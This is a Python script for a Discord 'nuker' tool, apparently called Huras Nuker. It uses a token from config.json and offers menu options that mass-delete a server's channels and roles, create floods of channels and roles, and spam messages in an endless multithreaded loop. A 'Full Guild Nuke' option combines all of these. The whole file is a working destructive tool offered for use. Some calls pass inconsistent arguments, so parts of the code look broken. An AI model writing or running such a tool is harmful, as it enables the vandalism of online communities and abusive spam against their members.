from src import discord
from colorama import Fore
import threading
import time
import json
import os
from pystyle import Colors, Colorate

class Huras:
    def __init__(self):
        with open('config.json') as config_file:
            config = json.load(config_file)
        self.token=config['token']
        os.system('cls')
        print(r'''

  ___ ___                                 _______         __                     ____/\__
  /   |   \ __ ______________    ______   \      \  __ __|  | __ ___________    /   / /_/
 /    ~    \  |  \_  __ \__  \  /  ___/   /   |   \|  |  \  |/ // __ \_  __ \   \__/ / \ 
 \    Y    /  |  /|  | \// __ \_\___ \   /    |    \  |  /    <\  ___/|  | \/   / / /   \
  \___|_  /|____/ |__|  (____  /____  >  \____|__  /____/|__|_ \\___  >__|     /_/ /__  /
       \/                   \/     \/          \/           \/    \/          \/   \/ 
              
                                    {0}Made By{0} FxckHuraqq 
                                           
                                          │  {2}1 {1} » {0}Channel Creater  │ 
                                          │  {2}2 {1} » {0}Channels Deleter │
                                          │  {2}3 {1} » {0}Roles Creater    │
                                          │  {2}4 {1} » {0}Roles Deleter    │
                                          │  {2}5 {1} » {0}Send messages    │
                                          │  {2}6 {1} » {0}Full Guild Nuke  │
                                                                                                                                                                                                   
'''.format(
    Fore.RED,
    Fore.BLUE,
    Fore.GREEN
))
        opt = int(input(F"{Fore.GREEN}{Fore.RED}Option ~/> {Fore.BLUE}$ "))
        if opt == 1:
            channels_name = input(F"{Fore.RED}channels name ~/>{Fore.BLUE}> ")
            channels_num = int(input(F"{Fore.RED}Channels Numner ~/> {Fore.BLUE}> "))
            guild_id = input(F"{Fore.RED}Server id ~/>{Fore.BLUE}> ")
            def create_channel():
                discord.Discord(self.token).create_channel(channels_name, guild_id)
            for i in range(channels_num):
                threading.Thread(target=create_channel).start()
            time.sleep(5)
            Huras()
        if opt == 2:
            guild_id = input(F"{Fore.RED}Server id ~/>{Fore.BLUE}> ")
            channels = discord.Discord(self.token).get_channels(guild_id)
            def delete_channel(channel_id, none):
                discord.Discord(self.token).delete_channels(channel_id)
            for channel in channels:
                threading.Thread(target=delete_channel, args=(channel, True)).start()
            time.sleep(5)
            Huras()
        if opt == 3:
            roles_num = int(input(F"{Fore.RED}Roles Number ~/>{Fore.BLUE}> "))
            roles_name = input(F"{Fore.RED}Roles Name ~/>{Fore.BLUE}> ")
            guild_id = input(F"{Fore.RED}Server id ~/>{Fore.BLUE}> ")
            def create_roles():
                discord.Discord(self.token).create_roles(roles_name)
            for i in range(roles_num):
                threading.Thread(target=create_roles).start()
            time.sleep(5)
            Huras()
        if opt == 4:
            guild_id = input(F"{Fore.RED}Server id ~/>{Fore.BLUE}> ")
            roles = discord.Discord(self.token).get_roles()
            def delete_role(role, none):
                discord.Discord(self.token).delete_role(guild_id, role)
            for role in roles:
                threading.Thread(target=delete_role, args=(role, True)).start()
            time.sleep(5)
            Huras()
        if opt == 5:
            message = input(F"{Fore.RED}Message ~/>{Fore.BLUE}> ")
            guild_id = input(F"{Fore.RED}Server id ~/>{Fore.BLUE}> ")
            channels = discord.Discord(self.token).get_channels(guild_id)
            def send_messages(channel_id, none):
                discord.Discord(self.token).send_message(message, channel_id)
            while True:
                for channel_id in channels:
                    for i in range(2):
                        threading.Thread(target=send_messages, args=(channel_id, True)).start()
        if opt == 6:
            channels_name = input(F"{Fore.RED}Channels name ~/>{Fore.BLUE}> ")
            guild_id = input(F"{Fore.RED}Server id ~/>{Fore.BLUE}> ")
            message = input(F"{Fore.RED}Message ~/>{Fore.BLUE}> ")

            roles = discord.Discord(self.token).get_roles(guild_id)
            channels = discord.Discord(self.token).get_channels(guild_id)

            def send_messages(channel_id, none):
                discord.Discord(self.token).send_message(message, channel_id)
            def delete_channel(channel_id, none):
                discord.Discord(self.token).delete_channels(channel_id)
            def create_channel():
                discord.Discord(self.token).create_channel(channels_name, guild_id)

            for channel in channels:
                threading.Thread(target=delete_channel, args=(channel, True)).start()
            for i in range(100):
                threading.Thread(target=create_channel).start()
            time.sleep(5)
            channels = discord.Discord(self.token).get_channels(guild_id)
            while True:
                for channel_id in channels:
                    for i in range(2):
                        threading.Thread(target=send_messages, args=(channel_id, True)).start()

Huras()
